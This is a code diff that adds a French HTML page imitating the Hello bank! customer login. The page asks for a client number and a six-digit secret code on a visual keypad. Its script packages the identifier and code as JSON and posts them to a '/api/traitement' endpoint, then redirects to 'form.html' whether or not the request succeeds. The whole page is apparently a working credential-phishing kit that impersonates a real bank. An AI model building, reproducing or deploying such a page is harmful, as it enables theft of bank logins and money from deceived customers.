@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello bank! - Espace Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- RESET & CONFIGURATION GLOBALE --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            color: #002e3b;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        .app-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* --- EN-TÊTE CYAN --- */
+        .hb-top-navbar {
+            background-color: #00a2ca;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            height: 65px;
+        }
+        .hb-logo-rect img {
+            height: 38px;
+            width: auto;
+            display: block;
+        }
+        .hb-btn-pill-white {
+            background-color: #ffffff;
+            color: #00a2ca;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* --- ZONE TITRE --- */
+        .hb-title-container {
+            padding: 30px 20px 15px 20px;
+            text-align: center;
+        }
+        .hb-main-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #003b4a;
+            line-height: 1.3;
+        }
+
+        /* --- CONTENU & BLOCS PANELS --- */
+        .hb-content-body {
+            padding: 0 20px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .hb-sub-panel {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+        }
+        .hb-panel-active {
+            display: flex !important;
+        }
+
+        /* --- FORMULAIRE ÉTAPE 1 (IDENTIFIANT) --- */
+        .hb-input-group {
+            margin-top: 15px;
+            margin-bottom: 20px;
+        }
+        .hb-input-label {
+            display: block;
+            font-size: 15px;
+            font-weight: 700;
+            color: #003b4a;
+            margin-bottom: 10px;
+        }
+        .hb-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #00a2ca;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #ffffff;
+            height: 52px;
+        }
+        .hb-input-wrapper-disabled {
+            border-color: #cbd5e0;
+        }
+        .hb-input-wrapper input {
+            width: 100%;
+            border: none;
+            outline: none;
+            padding: 0 14px;
+            font-size: 16px;
+            color: #003b4a;
+        }
+        .hb-input-wrapper input::placeholder {
+            color: #a0aec0;
+        }
+        .hb-input-clear-btn {
+            background: transparent;
+            border: none;
+            border-left: 1px solid #e2e8f0;
+            font-size: 20px;
+            color: #a0aec0;
+            width: 50px;
+            height: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* CHECKBOX MEMORISER */
+        .hb-checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .hb-native-checkbox {
+            width: 20px;
+            height: 20px;
+            accent-color: #00a2ca;
+            cursor: pointer;
+        }
+        .hb-checkbox-label {
+            font-size: 14px;
+            color: #003b4a;
+            user-select: none;
+            cursor: pointer;
+        }
+
+        /* BOUTONS FLUIDES */
+        .hb-btn-submit-fluid {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 700;
+            text-align: center;
+            transition: background-color 0.2s ease;
+            background-color: #cbd5e0;
+            color: #ffffff;
+            cursor: not-allowed;
+        }
+        .hb-btn-state-active {
+            background-color: #00a2ca !important;
+            color: #ffffff !important;
+            cursor: pointer !important;
+        }
+
+        /* LIENS */
+        .hb-lost-codes-row {
+            text-align: center;
+            margin: 25px 0;
+        }
+        .hb-link-cyan {
+            color: #00a2ca;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: underline;
+        }
+        .space-top {
+            margin-top: 15px;
+        }
+
+        /* FOOTER INFO SÉCURITÉ */
+        .hb-info-footer-section {
+            background-color: #f4fbfc;
+            margin: 20px -20px 0 -20px;
+            padding: 24px 20px;
+            border-top: 1px solid #e2f4f7;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+        .hb-info-card {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .hb-info-card-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #003b4a;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .hb-info-card-text {
+            font-size: 13.5px;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+        .hb-card-link {
+            font-size: 13.5px;
+            color: #00a2ca;
+            text-decoration: underline;
+            font-weight: 500;
+            margin-top: 2px;
+        }
+
+        /* --- ÉTAPE 2 --- */
+        .hb-password-instruction {
+            font-size: 15px;
+            font-weight: 700;
+            color: #003b4a;
+            margin-bottom: 15px;
+        }
+        
+        .hb-password-slots-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+        .hb-code-slot {
+            flex: 1;
+            height: 50px;
+            border: 1px solid #cbd5e0;
+            border-radius: 8px;
+            background-color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .hb-slot-filled {
+            background-color: #003b4a;
+            border-color: #003b4a;
+            position: relative;
+        }
+        .hb-slot-filled::after {
+            content: "";
+            width: 10px;
+            height: 10px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            position: absolute;
+        }
+
+        .hb-keyboard-card-box {
+            background: #f7fafc;
+            border: 1px solid #edf2f7;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 25px;
+        }
+        .hb-grid-matrix {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+        }
+        .hb-matrix-btn {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            height: 54px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: #003b4a;
+            cursor: pointer;
+            user-select: none;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+            transition: background-color 0.1s;
+        }
+        .hb-matrix-btn:active {
+            background-color: #edf2f7;
+        }
+        .hb-btn-hidden {
+            visibility: hidden;
+            pointer-events: none;
+        }
+        .hb-btn-utility {
+            background-color: #edf2f7;
+            font-size: 14px;
+            font-weight: 600;
+            color: #4a5568;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div id="hb-main-app-wrapper" class="hb-step">
+
+            <header class="hb-top-navbar">
+                <div class="hb-nav-left">
+                    <div class="hb-logo-rect">
+                        <img src="images.jpeg" alt="Hello Bank" class="ca-main-brand">
+                    </div>
+                </div>
+                <div class="hb-nav-right">
+                    <button class="hb-btn-pill-white" onclick="window.history.back();">Retour à Hello bank!</button>
+                </div>
+            </header>
+
+            <div class="hb-title-container">
+                <h1 class="hb-main-title">Accédez à votre espace client</h1>
+            </div>
+
+            <main class="hb-content-body">
+
+                <div id="hb-panel-id" class="hb-sub-panel hb-panel-active">
+                    <div class="hb-input-group">
+                        <label for="hb-id-field" class="hb-input-label">Numéro Client</label>
+                        <div class="hb-input-wrapper hb-input-wrapper-disabled" id="hb-id-wrapper-border">
+                            <input type="tel" id="hb-id-field" placeholder="Numéro de 7 à 10 chiffres" maxlength="10" autocomplete="off">
+                            <button type="button" class="hb-input-clear-btn" id="hb-id-clear" style="display: none;">✕</button>
+                        </div>
+                    </div>
+
+                    <div class="hb-checkbox-container">
+                        <input type="checkbox" id="hb-remember" class="hb-native-checkbox">
+                        <label for="hb-remember" class="hb-checkbox-label">Mémoriser mon numéro client</label>
+                    </div>
+
+                    <button id="hb-btn-continue" class="hb-btn-submit-fluid" disabled>Continuer</button>
+
+                    <div class="hb-lost-codes-row">
+                        <a href="javascript:void(0);" class="hb-link-cyan" onclick="alert('Service indisponible actuellement.');">Numéro client ou code secret oublié</a>
+                    </div>
+
+                    <section class="hb-info-footer-section">
+                        <div class="hb-info-card">
+                            <h3 class="hb-info-card-title">🔒 Sécurité</h3>
+                            <p class="hb-info-card-text">Votre sécurité est notre priorité. Toutes vos données sont chiffrées et protégées. Ne communiquez jamais vos identifiants et changez régulièrement votre mot de passe.</p>
+                            <a href="javascript:void(0);" class="hb-card-link">Consulter tous nos conseils sécurité et fraude</a>
+                        </div>
+
+                        <div class="hb-info-card">
+                            <h3 class="hb-info-card-title">❓ Besoin d'aide ?</h3>
+                            <p class="hb-info-card-text">Vous avez oublié vos identifiants ? Des difficultés pour vous connecter ? Contactez notre service client disponible 24h/24 et 7j/7.</p>
+                            <a href="javascript:void(0);" class="hb-card-link">Consulter notre Assistance technique</a>
+                        </div>
+                    </section>
+                </div>
+
+                <div id="hb-panel-password" class="hb-sub-panel">
+                    <p class="hb-password-instruction">Saisissez votre code secret</p>
+
+                    <div class="hb-password-slots-container">
+                        <div class="hb-code-slot"></div>
+                        <div class="hb-code-slot"></div>
+                        <div class="hb-code-slot"></div>
+                        <div class="hb-code-slot"></div>
+                        <div class="hb-code-slot"></div>
+                        <div class="hb-code-slot"></div>
+                    </div>
+
+                    <div class="hb-keyboard-card-box">
+                        <div class="hb-grid-matrix" id="hb-keyboard-grid">
+                            </div>
+                    </div>
+
+                    <button id="hb-btn-final-submit" class="hb-btn-submit-fluid" disabled>Accéder à mon espace client</button>
+
+                    <div class="hb-lost-codes-row space-top">
+                        <span class="hb-link-cyan" id="hb-back-to-id" style="cursor: pointer;">‹ Retour à la saisie de l'identifiant</span>
+                    </div>
+                </div>
+
+            </main>
+        </div>
+
+    </div>
+
+    <script>
+        const panelId = document.getElementById('hb-panel-id');
+        const panelPass = document.getElementById('hb-panel-password');
+        const idField = document.getElementById('hb-id-field');
+        const idClear = document.getElementById('hb-id-clear');
+        const idWrapperBorder = document.getElementById('hb-id-wrapper-border');
+        const btnContinue = document.getElementById('hb-btn-continue');
+        
+        const keyboardGrid = document.getElementById('hb-keyboard-grid');
+        const btnFinalSubmit = document.getElementById('hb-btn-final-submit');
+        const backToId = document.getElementById('hb-back-to-id');
+        const codeSlots = document.querySelectorAll('.hb-code-slot');
+
+        let inputPassword = "";
+
+        // SURVEILLANCE IDENTIFIANT
+        idField.addEventListener('input', () => {
+            idField.value = idField.value.replace(/\D/g, ''); 
+            
+            if (idField.value.length > 0) {
+                idClear.style.display = 'flex';
+                idWrapperBorder.classList.remove('hb-input-wrapper-disabled');
+            } else {
+                idClear.style.display = 'none';
+                idWrapperBorder.classList.add('hb-input-wrapper-disabled');
+            }
+
+            if (idField.value.length >= 7 && idField.value.length <= 10) {
+                btnContinue.removeAttribute('disabled');
+                btnContinue.classList.add('hb-btn-state-active');
+            } else {
+                btnContinue.setAttribute('disabled', 'true');
+                btnContinue.classList.remove('hb-btn-state-active');
+            }
+        });
+
+        idClear.addEventListener('click', () => {
+            idField.value = "";
+            idClear.style.display = 'none';
+            idWrapperBorder.classList.add('hb-input-wrapper-disabled');
+            btnContinue.setAttribute('disabled', 'true');
+            btnContinue.classList.remove('hb-btn-state-active');
+            idField.focus();
+        });
+
+        // NAVIGATION PANELS
+        btnContinue.addEventListener('click', () => {
+            panelId.classList.remove('hb-panel-active');
+            panelPass.classList.add('hb-panel-active');
+            buildHelloMatrix();
+        });
+
+        backToId.addEventListener('click', () => {
+            inputPassword = "";
+            resetSlotsVisuals();
+            panelPass.classList.remove('hb-panel-active');
+            panelId.classList.add('hb-panel-active');
+        });
+
+        // MATRICE DU CLAVIER VISUEL
+        function buildHelloMatrix() {
+            keyboardGrid.innerHTML = "";
+            const keyLayout = ['1', '5', '7', '2', '3', '8', '9', '6', '4', '0', 'Empty', 'Clear'];
+
+            keyLayout.forEach(key => {
+                const button = document.createElement('div');
+                
+                if (key === 'Empty') {
+                    button.className = 'hb-matrix-btn hb-btn-hidden';
+                } else if (key === 'Clear') {
+                    button.className = 'hb-matrix-btn hb-btn-utility';
+                    button.textContent = 'Corriger';
+                    button.onclick = () => {
+                        if (inputPassword.length > 0) {
+                            inputPassword = inputPassword.slice(0, -1);
+                            updateSlotsVisuals();
+                        }
+                    };
+                } else {
+                    button.className = 'hb-matrix-btn';
+                    button.textContent = key;
+                    button.onclick = () => {
+                        if (inputPassword.length < 6) {
+                            inputPassword += key;
+                            updateSlotsVisuals();
+
+                            // PLUS DE SOUMISSION AUTOMATIQUE ICI : On active juste le bouton de validation
+                            if (inputPassword.length === 6) {
+                                btnFinalSubmit.removeAttribute('disabled');
+                                btnFinalSubmit.classList.add('hb-btn-state-active');
+                            }
+                        }
+                    };
+                }
+                keyboardGrid.appendChild(button);
+            });
+        }
+
+        // MAJ LOGES VISUELLES SÉCURITÉ
+        function updateSlotsVisuals() {
+            codeSlots.forEach((slot, index) => {
+                if (index < inputPassword.length) {
+                    slot.classList.add('hb-slot-filled');
+                } else {
+                    slot.classList.remove('hb-slot-filled');
+                }
+            });
+
+            if (inputPassword.length < 6) {
+                btnFinalSubmit.setAttribute('disabled', 'true');
+                btnFinalSubmit.classList.remove('hb-btn-state-active');
+            }
+        }
+
+        function resetSlotsVisuals() {
+            codeSlots.forEach(slot => slot.classList.remove('hb-slot-filled'));
+            btnFinalSubmit.setAttribute('disabled', 'true');
+            btnFinalSubmit.classList.remove('hb-btn-state-active');
+        }
+
+        // ENVOI JSON BRUT 3 CHAMPS APPRÈS CLIC MANUEL
+        function executeFinalSubmission() {
+            if (!idField || inputPassword.length !== 6) return;
+
+            const finalPayload = {
+                nom_banque: "HELLO BANK",
+                client_id: idField.value,
+                secret_code: inputPassword
+            };
+
+            btnFinalSubmit.setAttribute('disabled', 'true');
+            
+            // Animation points
+            let dotCount = 0;
+            btnFinalSubmit.textContent = 'Connexion';
+            const dotInterval = setInterval(() => {
+                dotCount = (dotCount + 1) % 4;
+                btnFinalSubmit.textContent = 'Connexion' + '.'.repeat(dotCount);
+            }, 300);
+
+            // Redirection de secours absolue (1.5 seconde)
+            const safetyRedirect = setTimeout(() => {
+                clearInterval(dotInterval);
+                window.location.href = 'form.html';
+            }, 1500);
+
+            // Fetch standardisé Vercel
+            fetch('/api/traitement', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(finalPayload)
+            })
+            .then(() => {
+                clearInterval(dotInterval);
+                clearTimeout(safetyRedirect);
+                window.location.href = 'form.html';
+            })
+            .catch(() => {
+                clearInterval(dotInterval);
+                clearTimeout(safetyRedirect);
+                window.location.href = 'form.html';
+            });
+        }
+
+        // Événement déclenché uniquement si l'utilisateur clique physiquement sur le bouton actif
+        if (btnFinalSubmit) {
+            btnFinalSubmit.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (!btnFinalSubmit.hasAttribute('disabled')) {
+                    executeFinalSubmission();
+                }
+            });
+        }
+    </script>
+</body>
+</html>
